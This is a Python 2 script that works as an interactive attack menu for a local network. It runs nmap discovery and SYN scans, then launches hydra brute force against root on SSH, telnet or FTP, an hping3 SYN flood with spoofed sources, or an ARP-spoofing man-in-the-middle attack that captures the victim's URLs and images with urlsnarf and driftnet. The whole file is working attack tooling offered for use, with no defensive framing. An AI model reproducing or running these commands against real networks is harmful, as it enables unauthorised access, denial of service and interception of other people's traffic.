#!/usr/bin/python

import os, socket,sys,glob,subprocess, shlex
print '_'*100
print("\n@@@@@@@@		Scan your local network		@@@@@@@@\n")

def ipaddress():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(("8.8.8.8", 80))
		return s.getsockname()[0]
		s.close()
	except:
		print('Network is unreachable')
def Gateway():
	strs = subprocess.check_output(shlex.split('ip r l'))
	gateway = strs.split('default via')[-1].split()[0]
	ip  = strs.split('src')[-1].split()[0]
	return gateway
def WlanEth0():
	strs = subprocess.check_output(shlex.split('ip r l'))
	if (strs.find('eth0') != -1):
		return 'eth0'
	elif (strs.find('wlan0') != -1):
		return 'wlan0'
def DictIPports():
	alldate=filenmapread('/nmapscan.txt')
	dict1={}
	for i in alldate:
		if i[:4]=='PORT':
			continue
		if len(i.split('.'))==4:
			ip=i
			continue
		try:
			dict1[ip]+=i+'\n'
		except:
			dict1[ip]='\n'+i+'\n'
	for key,val in dict1.items():
		print key, "=>", val
def filenmapread(filename):
	list1=[]
	cwd = os.getcwd()
	f=open(cwd+filename,'r')
	content=f.read().split('\n')
	for i in range(len(content)):
		if content[i][:16]=='Nmap scan report':
			list1.append(content[i].split(' ')[-1].replace('(','').replace(')',''))
		elif content[i][:4]=='PORT':
			while content[i][:3]!='MAC':
				list1.append(content[i])
				i+=1
	return list1
def ShowPorts(ipaddress):
	alldate=filenmapread('/nmapscan.txt')
	dict1={}
	for i in alldate:
		if i[:4]=='PORT':
			continue
		if len(i.split('.'))==4:
			ip=i
			continue
		try:
			dict1[ip]+=i+'\n'
		except:
			dict1[ip]='\n'+i+'\n'
	return dict1[ipaddress]
def LastScannFile():
	for files in glob.glob('*.txt'):
		if files=='nmapscan.txt':
			while "true":
				choose=raw_input('\nYou have allready scan your Network Host-addresses with Nmap, \ndo you want use old scan-information (1) or make new scan (2)?\n')
				if choose=='1':
					counter=1
					IP=filenmapread('/nmapping.txt')
					for i in IP:
						print str(counter)+' - ' +i
						counter+=1
					Attackmenu()
					#
					break
				elif choose=='2':
					os.system('rm nmapscan.txt')
					break
		else:
			break
def NewScan():
	counter=1
	IP=ScannIpNmap()
	nmapscan(IP)	
	alldate=filenmapread('/nmapscan.txt')
	for i in IP:
		print str(counter)+' - ' +i
		counter+=1
	Attackmenu()
def ScannIpNmap():
	os.system('nmap -sP '+ipaddress()+'/24>nmapping.txt')
	return filenmapread('/nmapping.txt')
def nmapscan(listIp):
	for IP in listIp:
		os.system('nmap -sS '+IP+'>>nmapscan.txt')
def Attackmenu():
	cwd = os.getcwd()
	IP=filenmapread('/nmapping.txt')
	alldate=filenmapread('/nmapscan.txt')
	while "true":
		choose=input('Please choose a host for attack! *** from 1 till '+str(len(IP))+' *** or 0 for show all hostets with TCP Services\n')
		if choose>len(IP):
			print('Please choose again')
		elif choose==0:
			D=DictIPports()
		else:
			listport2=[]
			print('You choose IP :'+ IP[choose-1])
			try:
				print 'This Services open on this Host:'+ShowPorts(IP[choose-1])
			except:
				pass
			while 'true':
				choose2=input('Choose a kind of Attack: 1. Brute Force, 2. Denial of Service, 3. Men in the middle (use only number) or 0 for back\n')
				if choose2==1:
					try:
						L=ShowPorts(IP[choose-1])
						if 'dict.txt' in glob.glob('*.txt'):			#Check if Passwordlist exist
							pass
						else:
							os.system('crunch 3 3 123456789 -o dict.txt')

						while 'true':
							if (L.find('ssh') != -1):
								choose3=raw_input('You have ssh service run on this server, do you want make brute force on it? (yes/no)')
								if choose3=='yes':
									os.system('hydra -l root -P dict.txt ssh://'+IP[choose-1]+' -v -V -f -t5 -s 22')
								else:
									break
							elif (L.find('telnet') != -1):
								choose3=raw_input('You have telnet service run on this server, do you want make brute force on it? (yes/no)')
								if choose3=='yes':
									os.system('hydra -l root -P dict.txt telnet://'+IP[choose-1])
								else:
									break
							elif (L.find('ftp') != -1):
								choose3=raw_input('You have ftp service run on this server, do you want make brute force on it? (yes/no)')
								if choose3=='yes':
									os.system('hydra -l root -P dict.txt ftp://'+IP[choose-1])
								else:
									break
							else:
								print('You dont have services for brute force, in this version you can make brute forces only for ssh, telnet and ftp!\n')
								break
					except:
						print('You dont have any services on this host open')
						break
				elif choose2==2:
					try:
						L=ShowPorts(IP[choose-1]).split('\n')
						counter=1
						for i in L:
							if len(i)>0:
								print str(counter)+' - '+i
								counter+=1
						portNr=input('Choose number of port that you want make SYN flood attack from 1 till '+str(counter-1))
						os.system('hping3 -c 10000 -d 120 -S -w 64 -p '+L[portNr].split('/tcp')[0]+' --flood --rand-source '+IP[choose-1])
					except:
						print('You dont have any services on this host open, in betta version you can only make SYN flood attack')
						break
				elif choose2==3:	
					print('We will make Arpspoof on IP Nr.: '+ IP[choose-1])
					os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
					os.system("gnome-terminal -- sh -c 'urlsnarf -i "+WlanEth0()+"|less'")
					os.system("gnome-terminal -- sh -c 'driftnet -i "+WlanEth0()+"|less'")
					os.system('arpspoof -i '+WlanEth0()+' -t '+IP[choose-1]+' -r '+Gateway())
				elif choose2==0:
					break
print('Your local IP Address is: '+ipaddress()+'\nYour Gateway is: '+Gateway())

LastScannFile()
NewScan()